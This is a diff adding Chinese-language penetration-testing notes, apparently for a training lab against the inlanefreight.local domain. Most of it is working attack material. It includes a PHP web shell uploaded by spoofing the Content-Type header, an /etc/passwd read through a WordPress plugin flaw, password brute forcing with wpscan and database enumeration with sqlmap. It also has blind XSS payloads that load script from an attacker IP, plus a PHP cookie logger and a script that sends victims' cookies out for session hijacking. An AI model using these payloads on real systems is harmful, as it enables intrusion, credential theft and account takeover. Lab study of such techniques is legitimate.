@@ -91,4 +91,49 @@ http://careers.inlanefreight.local/profile?id=9，对 id 参数进行模糊测�
 
 gobuster dir -u http://dev.inlanefreight.local -w /usr/share/wordlists/dirb/common.txt -x .php -t 300      爆破目录
   https://github.com/OJ/gobuster
+使用 OPTIONS 方法请求页面，看到允许多种方法：GET,POST,PUT,TRACK,OPTIONS      
+使用 TRACK 方法请求该页面，即 HTTP 动词篡改 (HTTP Verb Tampering) 漏洞
+将以下文件另存为 5351bf7271abaa2267e03c9ef6393f13.php 或类似，一个随机文件名是一个好习惯，随机的攻击者就不会偶然发现
+<?php system($_GET['cmd']); ?>
+尝试上传 .php 文件会导致错误：“JPG, JPEG, PNG & GIF files are allowed.”，存在一些弱的客户端验证 (client-side validation)
+抓取 POST 请求，发送到 Repeater，修改请求中的 Content-Type: 头，将头更改为 Content-Type: image/png，以将 web shell 伪装成有效的 PNG
+curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=id      执行 web shell
+
+有网页托管在 WordPress
+sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local      枚举 WordPress 的插件
+curl http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd      mail-masta 插件的漏洞
+wpscan -e u -t 500 --url http://ir.inlanefreight.local      枚举用户
+wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp      爆破 ilfreightwp
+sqlmap -r sqli.txt --dbms=mysql      自动 SQL 攻击工具，sqli.txt 是一个 POST 完整请求
+sqlmap -r sqli.txt --dbms=mysql --dbs                    枚举数据库
+sqlmap -r sqli.txt --dbms=mysql -D status --tables      枚举 status 库里的表格
+
+有工单提交网页
+在 Message 字段中包含以下内容，并提交工单
+  "><script src=http://10.10.14.15:9000/TESTING_THIS></script>            盲注跨站脚本 (Blind Cross-Site Scripting, XSS)
+nc -lvnp 9000      提交前监听
+创建 ndex.php
+    <?php
+  if (isset($_GET['c'])) {
+      $list = explode(";", $_GET['c']);
+      foreach ($list as $key => $value) {
+          $cookie = urldecode($value);
+          $file = fopen("cookies.txt", "a+");
+          fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+          fclose($file);
+      }
+  }
+  ?>
+创建 script.js
+  new Image().src='http://10.10.14.15:9200/index.php?c='+document.cookie
+sudo php -S 0.0.0.0:9200      启动 php 网页服务
+在 Message 字段中包含以下内容，并提交工单
+  "><script src=http://10.10.14.15:9200/script.js></script>
+用像 Cookie-Editor 的 Firefox 插件，使用管理员的会话 cookie 登录
+  https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search
+
+有应用程序接收用户输入并生成一个 PDF 文档
+插入一个简单的 JavaScript payload，如 <script>document.write('TESTING THIS')</script>，发现 JS 被执行，即 SSRF 漏洞，弱版 XSS
+  https://appsecco.com/blog/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2
+  https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f
 
